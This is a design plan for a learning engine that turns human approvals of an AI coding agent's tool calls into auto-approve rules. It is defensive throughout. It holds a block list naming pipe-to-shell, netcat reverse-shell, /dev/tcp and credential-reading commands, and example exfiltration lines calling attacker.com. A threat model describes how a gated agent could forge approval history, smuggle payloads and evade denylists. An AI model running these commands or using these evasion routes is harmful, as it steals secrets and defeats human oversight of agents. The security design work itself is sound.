# Plan: Policy Learning Engine

_Last reviewed: 2026-07-03 (adversarial security pass, itr#422 — see Security Invariants section and ADR-0005)_

## Problem

Wisphive's auto-approve rules are static — a human writes patterns in `config.json`, the hook evaluates them. Over time, a user builds muscle memory: "I always approve `cargo test`", "I always approve Read calls", "I always deny anything touching `.env`". This knowledge exists only in the human's head and in the `decision_log` SQLite table. The system never learns.

The goal is a daemon background task that analyzes the `decision_log`, detects patterns with high confidence, and either suggests new rules for human confirmation or (at the user's opt-in) auto-applies them.

## Why This Is Dangerous

Removing the human from the loop has consequences that static auto-approve tiers don't:

1. **Learned rules compound.** A learned `allow_patterns: ["cargo"]` auto-approves `cargo test` but also `cargo publish --token $SECRET`. Static rules written by a human reflect understanding of blast radius. Learned rules reflect statistical frequency.

2. **Adversarial inputs.** An LLM agent can craft tool calls that look routine but aren't. If the system learns "Bash commands starting with `cargo` are safe," an agent can exploit that: `cargo test && curl attacker.com/exfil?data=$(cat .env)`. The learning engine sees `cargo` and auto-approves.

3. **Context collapse.** "User approved `rm` in project A (a scratch sandbox)" ≠ "approve `rm` in project B (production)." Learning from one context and applying to another is a category error.

4. **Confidence ≠ safety.** The user might approve a dangerous pattern 50 times because 50 agents asked for it and it was the right call each time. The 51st time, with a different agent in a different context, it could be catastrophic. High approval rate doesn't mean the pattern is safe to auto-approve.

**The learning engine must be more paranoid than the human, not less.**

---

## Safety Architecture: The Sus Layer

Before the learning engine can suggest or apply any rule, every candidate pattern passes through the **Sus Evaluator** — a hardcoded, non-configurable, non-overridable set of checks that flag patterns as suspect ("sus"). Sus patterns are never auto-applied, are visually distinguished in the TUI, and require explicit human acknowledgment with a confirmation step.

### Sus Classification

Every tool call pattern gets a sus score: `Clean`, `Caution`, or `Blocked`.

```rust
// wisphive_daemon/src/sus.rs

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum SusLevel {
    /// Pattern is safe to learn from.
    Clean,
    /// Pattern has suspicious characteristics. Can be suggested but not auto-applied.
    /// TUI shows yellow warning. Requires explicit "I understand the risk" confirmation.
    Caution,
    /// Pattern is categorically unsafe to auto-approve. Cannot be suggested or applied.
    /// Exists in the sus list regardless of approval history.
    Blocked,
}
```

### Blocked Patterns (never learnable, hardcoded)

These patterns can NEVER be promoted to auto-approve, no matter how many times the user manually approves them. They are evaluated as regex against tool input text.

```rust
const BLOCKED_BASH_PATTERNS: &[&str] = &[
    // Destructive filesystem operations
    r"rm\s+(-[a-zA-Z]*f|-[a-zA-Z]*r|--force|--recursive)",
    r"rmdir\s+",
    r"mkfs",
    r"dd\s+.*of=/dev/",
    r">\s*/dev/sd",

    // Credential and secret exfiltration
    r"curl\s+.*\|\s*(sh|bash|zsh)",       // pipe-to-shell
    r"wget\s+.*\|\s*(sh|bash|zsh)",
    r"curl\s+.*(-d|--data).*(\$|`)",       // POST with variable expansion
    r"cat\s+.*(\.env|\.pem|\.key|id_rsa|credentials|secret|token)",
    r"base64\s+.*(\.env|\.pem|\.key|id_rsa|credentials|secret)",
    r"echo\s+.*>>\s*~/.ssh/authorized_keys",

    // Package/registry operations (irreversible publication)
    r"cargo\s+publish",
    r"npm\s+publish",
    r"pip\s+upload",
    r"docker\s+push",
    r"git\s+push\s+.*--force",
    r"git\s+push\s+.*-f\b",

    // Process and system manipulation
    r"kill\s+-9",
    r"killall",
    r"sudo\b",
    r"chmod\s+777",
    r"chown\s+",

    // Database destruction
    r"DROP\s+(TABLE|DATABASE|SCHEMA)",
    r"TRUNCATE\s+TABLE",
    r"DELETE\s+FROM\s+\w+\s*;?\s*$",      // DELETE without WHERE

    // Network exfiltration patterns
    r"nc\s+(-e|--exec)",                    // netcat reverse shell
    r"ncat\s+",
    r"/dev/tcp/",
    r"eval\s*\(",                           // eval with dynamic input
];

const BLOCKED_WRITE_PATHS: &[&str] = &[
    // Credentials and secrets
    "**/.env",
    "**/.env.*",
    "**/*.pem",
    "**/*.key",
    "**/id_rsa*",
    "**/credentials*",
    "**/secrets/**",
    "**/.ssh/**",

    // System configuration
    "**/etc/passwd",
    "**/etc/shadow",
    "**/etc/sudoers",

    // CI/CD pipelines (can execute arbitrary code)
    "**/.github/workflows/**",
    "**/.gitlab-ci.yml",
    "**/Jenkinsfile",

    // Package manifests (can add malicious dependencies)
    "**/Cargo.toml",
    "**/package.json",
    "**/pyproject.toml",
    "**/go.mod",
    "**/Gemfile",
    "**/requirements.txt",
];
```

**These lists are compiled into the binary. They are not configurable.** A user who wants to auto-approve `cargo publish` must add it to `auto_approve_add` in `config.json` manually with full awareness — the learning engine will never suggest it.

### Caution Patterns (learnable with friction)

Patterns that pass the Blocked check but have characteristics that warrant extra scrutiny:

```rust
fn evaluate_caution(tool_name: &str, input_text: &str) -> bool {
    match tool_name {
        "Bash" => {
            // Pipe chains (can hide intent)
            input_text.contains('|')
            // Variable expansion (dynamic content)
            || input_text.contains("$(") || input_text.contains('`')
            // Redirect to file (could overwrite)
            || input_text.contains('>') && !input_text.contains(">>")
            // Network access
            || input_text.contains("curl ") || input_text.contains("wget ")
            || input_text.contains("ssh ") || input_text.contains("scp ")
            // Multiple commands chained
            || input_text.contains("&&") || input_text.contains(';')
        }
        "Write" | "Edit" | "NotebookEdit" => {
            // Writing to dotfiles or hidden directories
            extract_file_path(tool_name, input_text)
                .map(|p| {
                    let s = p.to_string_lossy();
                    s.contains("/.") || s.starts_with('.')
                })
                .unwrap_or(false)
        }
        _ => false,
    }
}
```

**Caution patterns CAN be suggested** but get special treatment:
- TUI shows them with a yellow `⚠ CAUTION` badge
- Accepting the suggestion requires a second confirmation: "This pattern involves [pipe chains / variable expansion / network access]. Auto-approve anyway? (y/N)"
- They are never auto-applied, even with `auto_learn: true`
- The suggestion includes the specific caution reason so the user understands *why* friction exists

### Clean Patterns

Everything that isn't Blocked or Caution. These are candidates for learning, suggestion, and (with opt-in) auto-application.

---

## Learning Engine Design

### Data Source

The `decision_log` table in SQLite already contains everything needed:

```sql
-- Schema (existing):
decision_log (
    id TEXT PRIMARY KEY,
    agent_id TEXT,
    agent_type TEXT,
    project TEXT,
    tool_name TEXT,
    tool_input TEXT,       -- JSON
    decision TEXT,         -- "Approve" | "Deny"
    requested_at TEXT,
    resolved_at TEXT,
    tool_use_id TEXT,
    auto_approved INTEGER, -- 0 = human-reviewed, 1 = auto-approved
    hook_event_name TEXT
)
```

The learning engine queries only `auto_approved = 0` rows — it learns from **human decisions**, not from its own auto-approves. This prevents feedback loops where auto-approved patterns inflate their own confidence scores.

### Pattern Extraction

The engine doesn't learn exact tool inputs (too specific). It extracts **generalized patterns** from clusters of similar decisions.

```rust
/// Extract a learnable pattern from a tool call.
fn extract_pattern(tool_name: &str, tool_input: &Value) -> Option<LearnablePattern> {
    match tool_name {
        "Bash" => {
            let cmd = tool_input.get("command")?.as_str()?;
            // Extract the command prefix (first word or first two words)
            let prefix = extract_command_prefix(cmd);
            Some(LearnablePattern::BashPrefix(prefix))
        }
        "Write" | "Edit" | "NotebookEdit" => {
            let path = tool_input.get("file_path")?.as_str()?;
            // Extract the directory + extension pattern
            let dir = Path::new(path).parent()?.to_string_lossy().to_string();
            let ext = Path::new(path).extension()?.to_string_lossy().to_string();
            Some(LearnablePattern::FilePath { dir_prefix: dir, extension: ext })
        }
        _ => {
            // For other tools, the tool name itself is the pattern
            Some(LearnablePattern::ToolName(tool_name.to_string()))
        }
    }
}

/// Extract a command prefix for Bash pattern matching.
/// "cargo test --release" → "cargo test"
/// "git status" → "git status"
/// "ls -la src/" → "ls"
fn extract_command_prefix(cmd: &str) -> String {
    let words: Vec<&str> = cmd.split_whitespace().collect();
    match words.first() {
        Some(&"cargo") | Some(&"git") | Some(&"npm") | Some(&"yarn")
        | Some(&"pip") | Some(&"python") | Some(&"node") | Some(&"make")
        | Some(&"just") => {
            // Two-word prefix for subcommand tools
            words.iter().take(2).copied().collect::<Vec<_>>().join(" ")
        }
        Some(word) => word.to_string(),
        None => String::new(),
    }
}
```

### Analysis Query

The daemon runs this periodically (configurable interval, default: every 30 minutes):

```sql
-- Find patterns with high human-approval rate, excluding auto-approved rows
SELECT
    tool_name,
    -- Extract command prefix for Bash
    CASE
        WHEN tool_name = 'Bash' THEN
            substr(json_extract(tool_input, '$.command'), 1,
                   instr(json_extract(tool_input, '$.command') || ' ', ' ') +
                   instr(substr(json_extract(tool_input, '$.command'),
                         instr(json_extract(tool_input, '$.command') || ' ', ' ') + 1) || ' ', ' '))
        WHEN tool_name IN ('Write', 'Edit', 'NotebookEdit') THEN
            json_extract(tool_input, '$.file_path')
        ELSE tool_name
    END AS pattern_key,
    COUNT(*) AS total,
    SUM(CASE WHEN decision = '"Approve"' THEN 1 ELSE 0 END) AS approved,
    SUM(CASE WHEN decision = '"Deny"' THEN 1 ELSE 0 END) AS denied,
    COUNT(DISTINCT agent_id) AS distinct_agents,
    COUNT(DISTINCT project) AS distinct_projects,
    MAX(resolved_at) AS last_seen
FROM decision_log
WHERE auto_approved = 0
  AND resolved_at > datetime('now', '-30 days')
GROUP BY tool_name, pattern_key
HAVING total >= ?  -- minimum_samples threshold
ORDER BY total DESC
```

### Confidence Scoring

```rust
struct PatternAnalysis {
    tool_name: String,
    pattern_key: String,
    total: u32,
    approved: u32,
    denied: u32,
    distinct_agents: u32,
    distinct_projects: u32,
    last_seen: DateTime<Utc>,
    sus_level: SusLevel,
}

impl PatternAnalysis {
    fn approval_rate(&self) -> f64 {
        self.approved as f64 / self.total as f64
    }

    /// Confidence that this pattern should be auto-approved.
    /// Returns None if the pattern shouldn't be suggested at all.
    fn confidence(&self, config: &LearningConfig) -> Option<f64> {
        // Hard gates — must pass ALL of these
        if self.sus_level == SusLevel::Blocked {
            return None;
        }
        if self.total < config.minimum_samples {
            return None;
        }
        if self.denied > 0 && self.approval_rate() < config.minimum_approval_rate {
            return None;
        }
        // If the pattern was EVER denied, it requires higher thresholds
        if self.denied > 0 {
            if self.total < config.minimum_samples_with_denials {
                return None;
            }
        }

        // Confidence formula:
        // Base: approval rate (0.0 - 1.0)
        // Penalty: fewer samples = lower confidence (log scale)
        // Penalty: single-agent patterns score lower (could be one agent's habit)
        // Penalty: single-project patterns score lower (context-specific)
        let sample_factor = (self.total as f64).ln() / (config.minimum_samples as f64 * 10.0).ln();
        let agent_factor = if self.distinct_agents >= 2 { 1.0 } else { 0.7 };
        let project_factor = if self.distinct_projects >= 2 { 1.0 } else { 0.8 };
        let denial_penalty = if self.denied > 0 { 0.5 } else { 1.0 };

        let confidence = self.approval_rate()
            * sample_factor.min(1.0)
            * agent_factor
            * project_factor
            * denial_penalty;

        Some(confidence)
        }
}
```

### Configuration

```json
// ~/.wisphive/config.json
{
    "learning": {
        "enabled": true,
        "mode": "suggest",
        "analysis_interval_secs": 1800,
        "minimum_samples": 10,
        "minimum_samples_with_denials": 30,
        "minimum_approval_rate": 0.95,
        "auto_apply_threshold": 0.95,
        "auto_apply_requires_multi_agent": true,
        "auto_apply_requires_multi_project": false,
        "max_auto_rules_per_cycle": 3,
        "scope": "global"
    }
}
```

| Field | Default | Description |
|-------|---------|-------------|
| `enabled` | `true` | Run the analysis task at all |
| `mode` | `"suggest"` | `"suggest"` = TUI suggestions only. `"auto"` = auto-apply Clean patterns above threshold. `"off"` = disabled. |
| `analysis_interval_secs` | `1800` | How often to run analysis (30 min) |
| `minimum_samples` | `10` | Minimum human decisions before considering a pattern |
| `minimum_samples_with_denials` | `30` | If the pattern was ever denied, require more evidence |
| `minimum_approval_rate` | `0.95` | Minimum approval % to consider the pattern (95%) |
| `auto_apply_threshold` | `0.95` | Confidence score threshold for auto-application (only in `"auto"` mode) |
| `auto_apply_requires_multi_agent` | `true` | Require approvals from 2+ distinct agents to auto-apply |
| `auto_apply_requires_multi_project` | `false` | Require approvals from 2+ distinct projects to auto-apply |
| `max_auto_rules_per_cycle` | `3` | Max rules auto-applied per analysis cycle (rate limiting) |
| `scope` | `"global"` | `"global"` = learn across all projects. `"per_project"` = separate learning per project. |

### Operational Modes

#### Mode: `"suggest"` (default, recommended)

The learning engine analyzes patterns and broadcasts suggestions to the TUI/web. No rules are applied automatically. The human reviews each suggestion and accepts or dismisses.

```
Analysis cycle runs
  → finds: "cargo test" approved 47/47 times by 3 agents across 2 projects
  → sus check: Clean
  → confidence: 0.98
  → broadcasts: PolicySuggestion to TUI

TUI shows:
  ┌─────────────────────────────────────────────────────────┐
  │  SUGGESTED RULE                                         │
  │                                                         │
  │  Auto-approve: Bash commands starting with "cargo test" │
  │  Evidence: 47 approvals, 0 denials                      │
  │  Agents: 3 distinct  |  Projects: 2 distinct            │
  │  Confidence: 98%     |  Sus: Clean ✓                    │
  │                                                         │
  │  [A]ccept   [D]ismiss   [V]iew examples                 │
  └─────────────────────────────────────────────────────────┘
```

Accepting writes to `config.json`. The learner writes the **anchored `allow_prefix`** rule
type (I2) — **never** the substring `allow_patterns` array, which `apply_tool_rules`
(`wisphive_hook/src/main.rs:~1499`) matches as a case-insensitive substring and which a
learned entry would turn into a smuggling oracle (`curl attacker.com/x | sh  # cargo test`):
```json
{
    "tool_rules": {
        "Bash": {
            "allow_prefix": ["cargo test"],
            "_learned": {
                "cargo test": {
                    "source": "learning_engine",
                    "accepted_at": "2026-03-24T10:00:00Z",
                    "evidence": { "total": 47, "approved": 47, "denied": 0 },
                    "confidence": 0.98
                }
            }
        }
    }
}
```

The `allow_prefix` rule type is new (it does not exist in the hook yet — it ships with this
engine, matching only the parsed first command per I2). The `_learned` key is metadata only
(ignored by rule evaluation); it records provenance so the user can audit which rules were
human-written vs. machine-suggested.

#### Mode: `"auto"` (opt-in, requires understanding of risks)

Same as `suggest`, but patterns above `auto_apply_threshold` with `SusLevel::Clean` are applied directly to `config.json` without human confirmation. Caution patterns are still suggestion-only.

**Guardrails on auto mode:**
- `max_auto_rules_per_cycle` limits how many rules apply per cycle (default: 3). This prevents a flood of new rules from a single analysis batch.
- `auto_apply_requires_multi_agent` (default: true) means a pattern must be approved by 2+ agents. Single-agent patterns might reflect that agent's quirks, not universal safety.
- Every auto-applied rule is logged to `~/.wisphive/logs/learned_rules.jsonl` with full provenance.
- The TUI shows a notification banner: "Learning engine applied 2 new rules. Press [L] to review."
- Auto-applied rules can be reverted from the TUI's config panel (they're just entries in `config.json`).

**First-time activation warning:** When the user sets `mode: "auto"` for the first time, the daemon logs a prominent warning and the TUI shows a one-time modal:

```
  ┌──────────────────────────────────────────────────────┐
  │  ⚠ AUTO-LEARN MODE ENABLED                          │
  │                                                      │
  │  The learning engine will automatically add           │
  │  auto-approve rules based on your decision history.   │
  │                                                      │
  │  • Blocked patterns (rm -rf, secrets, publish) are   │
  │    NEVER auto-approved regardless of history.         │
  │  • Caution patterns (pipes, redirects, network)      │
  │    require manual confirmation.                      │
  │  • Max 3 rules per 30-minute cycle.                  │
  │  • All learned rules are logged and reversible.      │
  │                                                      │
  │  Review your blocked patterns:                       │
  │  wisphive config list-blocked                        │
  │                                                      │
  │  [I understand] [Cancel]                             │
  └──────────────────────────────────────────────────────┘
```

#### Mode: `"off"`

Learning engine doesn't run. No analysis, no suggestions, no auto-application. The daemon skips spawning the analysis task entirely.

---

## Security Invariants (adversarial pass, 2026-07-03 — itr#422, ADR-0005)

The Guidelines below this section describe design *principles*. This section states the **invariants** — properties that must hold in the implementation, each of which closes a concrete attack found during the adversarial review. Any implementation phase that cannot satisfy an invariant blocks until the invariant is renegotiated via a new ADR. The invariant set is recorded durably as [ADR-0005](decisions/0005-policy-learning-security-invariants.md).

### The enclosing threat model

The learner's adversary is not a remote attacker — it is **the gated agent itself**. Agents run as the same OS user as the daemon, produce the tool calls that become training data, control the free-text fields in those calls (commands, paths, agent identity), and are explicitly optimizing to get their tool calls approved. Every invariant below assumes the agent has read this plan document and is trying to mine it.

### I1 — The learner's config write surface is a whitelist

The engine may write exactly one thing: **prefix-anchored allow rules under `tool_rules.<tool>`** (plus their `_learned` metadata). It must be structurally incapable — not just configured not to — of writing `auto_approve_level`, `auto_approve_dangerous`, `auto_approve_add`, `always_ask_remove`, event toggles (`auto_approve_stop`, `auto_approve_user_prompt`), removing `deny_patterns`, or touching the always-defer set (ADR-0002). Enforce by construction: the config-writing function takes a `LearnedAllowRule` type, not a JSON path.

**Attack closed:** confidence-laundering a posture change ("the user approves everything anyway → suggest `auto_approve_level: all`"). The engine can only ever narrow the question to "should this specific prefix be pre-approved."

### I2 — Learned rules never use substring semantics

Today's `tool_rules.*.allow_patterns` are **case-insensitive substring** matches over the tool input (`wisphive_hook/src/main.rs` `apply_tool_rules`). A learned substring rule `"cargo test"` would auto-approve `curl attacker.com/x | sh  # cargo test`. Therefore:

- Learned Bash rules compile to a **new rule type** (`allow_prefix` or anchored regex) that matches only against the *parsed first command* of the input — first token(s), after shell-word splitting, with no preceding characters.
- Learned Write/Edit rules match on canonicalized absolute path prefix + extension, never substring.
- The learner **never** emits entries into the existing `allow_patterns` substring arrays.

**Parser soundness (load-bearing).** The anchor is only sound if the hook's "first command" extraction is a *superset* of what the executing shell would treat as the first command — anything the hook mis-identifies as the command head is an escape. The extractor must therefore account for constructs that shift or hide the command head: leading `VAR=value` assignments (`FOO=x cargo test` — the command is `cargo`, not `FOO=x`), leading assignments with expansion (`FOO=$(curl evil) cargo test` — already Caution via I3's `$()` rule, but the extractor must not silently treat `FOO=...` as the command), `env`/`command`/`nice`/`time` prefixes, brace/subshell groups, and IFS/quoting tricks. Whenever the extractor cannot confidently resolve the command head to a bare token, it returns *no match* (fall through to human review) rather than guessing — an ambiguous parse is a miss, and per the fail-closed default a miss must never auto-approve. Pin these cases as explicit tests before the rule type ships.

**Attack closed:** comment/argument smuggling — appending a learned token anywhere in a hostile command — and command-head shifting via assignment/wrapper prefixes.

### I3 — Sus evaluation runs at decision time, in the hook

Learn-time classification is insufficient: `cargo test` may be Clean as a *pattern* while `cargo test $(curl attacker.com/x)` is hostile as an *input*. Therefore:

- The sus evaluator lives in a **shared crate** compiled into both daemon and hook.
- At decision time, an input that evaluates `Caution` or `Blocked` is **never resolved by a learned rule**, even when a learned prefix matches. It falls through to human review. Compound commands (`&&`, `;`, `|`, `$()`, backticks, newlines, redirects) are Caution at decision time, so a learned simple-command prefix can never approve a chain.
- Learned rules carry an `engine_min_version` stamp; a hook binary older than the stamp ignores learned rules entirely (fail toward human review, consistent with the fail-closed default).

**Attack closed:** exploiting a legitimately-learned prefix with hostile arguments, command chaining, or version skew between a new daemon and a stale hook binary.

### I4 — Evidence is daemon-witnessed, individually-human-reviewed decisions only

Rows counted toward a pattern's confidence must satisfy **all** of:

- **Daemon-witnessed — select `auto_approved = 0 AND decision = 'approve'`, NOT the `decided_by` text.** The forgery-resistant handle is the pair of *structural* columns, not the copyable label. Precise mechanics (verified against code): the daemon writes `auto_approved = i64::from(decision == "approve")` for **every** row, including ingested ones (`decisions.rs:371`), and the `events.jsonl` ingest maps event kinds to decisions — `auto_approved → approve`, `deferred → ask`, `denied → deny` (`event_ingest.rs:290-292`). So a forged `{"event":"auto_approved",...}` append lands as `auto_approved = 1` (excluded because the learner wants `auto_approved = 0`), and a forged `{"event":"denied"|"deferred",...}` append lands as `auto_approved = 0` but with `decision` = `deny`/`ask` (excluded because the learner wants `decision = 'approve'`). The conjunction `auto_approved = 0 AND decision = 'approve'` therefore admits **only** approvals the daemon resolved itself — no `events.jsonl` row can enter it. (An earlier draft of this bullet claimed every ingested row is `auto_approved = 1`; that is false for `deferred`/`denied` and is the reason the filter must be the *conjunction*, not `auto_approved = 0` alone.) **Do not** filter on `decided_by = human`: `decided_by` is copied verbatim from the appended line by `ingest_line`, so a forged `human:*` label, while it can never enter the evidence set above, would still surface in `wisphive audit`. Hardening asks (filed, itr#426): the learning query uses the conjunction above; and `ingest_line` rejects/relabels any ingested `decided_by` beginning `human:` or `timeout:` so forged operator attribution never enters the audit stream.
- **Individually reviewed:** among the daemon-witnessed approvals selected above, exclude bulk resolutions and daemon-automatic approvals (`decided_by` beginning `timeout:` — trustworthy here because these are daemon-stamped, not ingested) — a bulk approve is queue hygiene, not a per-call judgment. Today `decided_by` is `human:tui` / `human:web:<id>` and does not distinguish bulk from individual; add that axis (itr#426). Note this is the *same field* as I7's `human:<resolver>` provenance — one `decided_by` string encodes both resolver and bulk/individual (e.g. `human:tui:individual`); I4 and I7 must agree on its grammar.
- **Unredacted:** rows whose `tool_input` contains the redaction marker (itr#89) are excluded — the true content is unknown, and learning a pattern containing `***REDACTED***` is meaningless at best.

**Attacks closed:** forged approval history via `events.jsonl` appends (excluded by the `auto_approved` column, and forged `human:*` labels blocked at ingest); confidence inflation via the human's own bulk-approve habit; pattern extraction from content the system deliberately refused to persist.

### I5 — Diversity thresholds resist manufactured evidence

- `distinct_agents` is **weak evidence**: `agent_id`/`session_id` are agent-supplied, and one agent can appear as many (subagents, fresh sessions). The multi-agent factor may remain as a soft penalty but must never be the load-bearing gate for auto-apply.
- Add a **time-diversity hard gate**: auto-apply requires evidence spanning ≥ N distinct days (default 5). Forty-seven approvals in one enthusiastic afternoon is one afternoon of judgment, not a stable policy.
- **Project scoping is hard for auto-apply**: a learned rule carries the project(s) it was learned in and auto-applies only there. Cross-project application always goes through human confirmation, regardless of confidence. (The existing `project_factor` soft penalty stays for suggestions.)

**Attack closed:** an agent flooding plausible requests to fabricate breadth; context collapse between a sandbox project and a production one.

### I6 — Deny-after-learn kill switch

If a human ever **denies** a tool call that a learned rule would have auto-approved (visible whenever learned-rule matches are surfaced on the review queue), or denies a call that a learned rule *did* auto-approve historically (spotted via `wisphive audit`), the rule is **revoked immediately and automatically** — no threshold, one strike. Revoked rules enter a tombstone list (I8) and can only return via fresh human confirmation.

**Attack closed:** a rule that was safe when learned becoming unsafe as context drifts, and persisting because confidence math dilutes one deny across many approves.

### I7 — Promotion lifecycle is explicit and audit-stamped

Rule states: `candidate → suggested → active_human | active_auto → revoked(tombstone)`. Every transition is appended to the decision audit stream (itr#397 consumers see it) with: the full evidence snapshot, confidence, sus level, `config_hash` before/after, the actor (`human:<resolver>` or `learning_engine`), and timestamp. `wisphive audit --decided-by learned:*` reconstructs the full history of any learned rule. The `_learned` metadata in `config.json` is a *cache* of provenance; the audit stream is the source of truth.

### I8 — Rollback is atomic, tombstoned, and cooled down

- Revert (manual or I6-triggered) writes `config.json` atomically (existing `write_config_atomic`).
- Revoked patterns are tombstoned: the engine must not re-suggest them for a cooldown (default 30 days) or until the human clears the tombstone. Otherwise a revoked rule reappears as a "new" suggestion on the next 30-minute cycle, and suggestion fatigue re-installs it.
- `wisphive emergency-off` disables learning (existing Guideline 7) **and** deactivates all `active_auto` rules in the same write — rules the human personally confirmed (`active_human`) survive, machine-promoted ones do not.

### I9 — The control plane protects itself from itself

`~/.wisphive/**` is added to `BLOCKED_WRITE_PATHS`, and Bash patterns targeting `~/.wisphive` (writes to `config.json`, `mode`, `events.jsonl`, the DB) are added to `BLOCKED_BASH_PATTERNS`. The learner must never suggest a rule whose effect is to pre-approve modification of wisphive's own state.

**Note (found during this pass, independent of the learner):** nothing today deny-lists agent writes to `~/.wisphive/` in the *static* rules either — an agent with an approved generic Write/Bash can edit `config.json` directly. Filed separately as a default-deny hardening issue; the learning engine must not ship before it. **Landed (itr#425):** the hook now forces any `Write`/`Edit`/`MultiEdit`/`NotebookEdit`/`Bash` call targeting `~/.wisphive/**` past every auto-approve layer to daemon human review, at any level, unless `allow_self_modification: true` is set — see `targets_control_plane` in `crates/wisphive_hook/src/main.rs`. This blocker for the learner is cleared. The guard covers the built-in Claude Code file tools by name and canonicalizes the target's existing ancestor (resolving symlinks + case-insensitive-FS spellings) before the containment check; operator-installed MCP filesystem servers that write by other tool names are out of scope, and a residual decision-time TOCTOU remains — human review is the belt-and-braces.

### I10 — The Blocked list is a backstop, not the security boundary

A regex denylist cannot be sound against an adversarial LLM (`$(echo rm) -rf`, `rm${IFS}-rf`, `find . -delete`, `python -c 'shutil.rmtree(...)'`, …). The Blocked list exists to stop the *learner* from suggesting obvious footguns, not to stop a hostile input at decision time. The properties that actually bound blast radius are structural: I1 (narrow write surface), I2 (anchored matching), I3 (decision-time sus + compound-command fallthrough), and the human remaining the only party who can widen policy. Documentation and TUI copy must never describe the Blocked list as a guarantee.

### Poisoning analysis (summary)

| Vector | Mitigation |
|---|---|
| Forge approval rows via `events.jsonl` | I4: daemon-witnessed evidence only |
| Inflate evidence via bulk approve | I4: `human:individual` only |
| Manufacture agent diversity | I5: agent identity is non-load-bearing; time-diversity hard gate |
| Smuggle payload past a learned pattern (substring/args/chaining) | I2 anchored prefixes + I3 decision-time sus |
| Launder a posture change through suggestions | I1 write-surface whitelist |
| Wear the human down until a bad suggestion is accepted | Caution friction + I8 tombstones (no re-suggestion loops) |
| Exploit drift after a rule is learned | I6 one-strike revocation |
| Self-modify the control plane | I9 + standalone default-deny issue |

---

## Guidelines: What Must Never Be Automated

These guidelines are not config — they are principles baked into the design.

### Guideline 1: The Sus Layer Is Not Configurable

The Blocked and Caution pattern lists are compiled into the binary. A user cannot add `rm -rf` to `auto_approve_add` via the learning engine. They CAN still add it manually to `config.json` — that's their choice with full awareness. But the learning engine will never suggest it, never auto-apply it, and will actively warn if it detects such a manual rule during startup.

**Rationale:** The learning engine's job is to reduce friction for safe patterns. If it can learn to approve dangerous ones, it defeats its own purpose. The human can always override manually — the engine just can't suggest the footgun.

### Guideline 2: Learn From Humans, Not From Self

The analysis query filters `auto_approved = 0`. The engine only counts human-reviewed decisions. This prevents feedback loops:

```
Bad: Engine auto-approves "git push" → decision_log records approve → engine sees more approvals → confidence increases
Good: Engine only counts manual approvals → auto-approved calls don't inflate confidence
```

### Guideline 3: Denials Are Weighted Heavily

A single denial in 100 approvals drops confidence significantly (the `denial_penalty` of 0.5, plus the higher `minimum_samples_with_denials` threshold). This is intentional — a denial means the user saw something wrong at least once. The pattern might be context-dependent.

**If the denial rate exceeds 10% for any pattern, the engine marks it as `Caution` regardless of the static sus check.** Dynamic caution based on observed behavior.

### Guideline 4: Scope Isolation

With `scope: "per_project"`, learning is project-local. Rules learned in project A don't apply in project B. This prevents the context collapse problem.

With `scope: "global"` (default), the `auto_apply_requires_multi_project` flag adds friction for cross-project application. A pattern approved only in one project starts as a suggestion, not an auto-apply.

### Guideline 5: Learned Rules Are Always Reversible

Every learned rule in `config.json` has a `_learned` metadata block with provenance. The TUI config panel shows learned rules distinctly (tagged "[Learned]") with a one-key revert. The CLI supports:

```bash
wisphive config list-learned         # show all learned rules with provenance
wisphive config revert-learned       # remove all learned rules
wisphive config revert-learned "cargo test"  # remove a specific learned rule
```

### Guideline 6: Rate Limiting Is Non-Negotiable

`max_auto_rules_per_cycle` has a hardcoded upper bound of 10 (even if the user sets it higher in config). The engine cannot apply more than 10 rules in a single 30-minute cycle. This prevents a scenario where a bulk import of historical data triggers a flood of new rules.

### Guideline 7: The Emergency Brake Still Works

`wisphive emergency-off` immediately:
1. Sets `~/.wisphive/mode` to `"off"` (all hooks pass through)
2. Sets `learning.mode` to `"off"` in `config.json`
3. No further rules are learned or applied

Reactivation requires explicitly setting both back to active.

### Guideline 8: Startup Audit

When the daemon starts, it reads `config.json` and checks all rules (both manual and learned) against the current Blocked list. If any rule matches a Blocked pattern:

```
[WARN] config.json contains a rule that matches a blocked pattern:
       tool_rules.Bash.allow_patterns: "cargo publish"
       This pattern matches blocked rule: cargo\s+publish
       The learning engine will never suggest this pattern.
       If you added this manually, you accept the risk.
```

This doesn't remove the rule (the user put it there intentionally), but it ensures the user knows.

---

## Implementation

### New Files

| File | Purpose | Size |
|------|---------|------|
| `wisphive_daemon/src/sus.rs` | Sus evaluator: Blocked/Caution/Clean classification | ~250 LOC |
| `wisphive_daemon/src/learning.rs` | Learning engine: analysis, confidence scoring, rule suggestion/application | ~400 LOC |

### Modified Files

| File | Change | Size |
|------|--------|------|
| `wisphive_daemon/src/server.rs` | Spawn learning task in `Server::run()`, broadcast suggestions | ~30 LOC |
| `wisphive_daemon/src/config.rs` | Add `LearningConfig` to `UserConfig`, startup audit | ~50 LOC |
| `wisphive_daemon/src/state.rs` | Add `query_patterns()` method for the analysis query | ~40 LOC |
| `wisphive_protocol/src/types.rs` | Add `PolicySuggestion`, `SusLevel` types | ~40 LOC |
| `wisphive_tui` | Suggestion panel, learned rule display, auto-mode confirmation modal | ~200 LOC |
| `wisphive_web` | Suggestion component, learned rules tab | ~150 LOC |

### Protocol Additions

```rust
// wisphive_protocol/src/types.rs

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicySuggestion {
    pub id: Uuid,
    pub tool_name: String,
    pub pattern: String,
    pub rule_type: String,           // "allow_prefix" (Bash) | "allow_path" (Write/Edit) — the anchored types per I2; NEVER "allow_patterns" (substring)
    pub evidence: PatternEvidence,
    pub confidence: f64,
    pub sus_level: SusLevel,
    pub caution_reasons: Vec<String>, // empty if Clean
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PatternEvidence {
    pub total: u32,
    pub approved: u32,
    pub denied: u32,
    pub distinct_agents: u32,
    pub distinct_projects: u32,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
}

// New ServerMessage variants:
pub enum ServerMessage {
    // ...existing...
    PolicySuggestions { suggestions: Vec<PolicySuggestion> },
    PolicyAutoApplied { rule: PolicySuggestion },
    LearningAuditWarning { message: String },
}

// New ClientMessage variants:
pub enum ClientMessage {
    // ...existing...
    AcceptSuggestion { id: Uuid },
    DismissSuggestion { id: Uuid },
    ListLearnedRules,
    RevertLearnedRule { pattern: String, tool_name: String },
}
```

### Implementation Order

| Phase | What | Depends On | Risk |
|-------|------|------------|------|
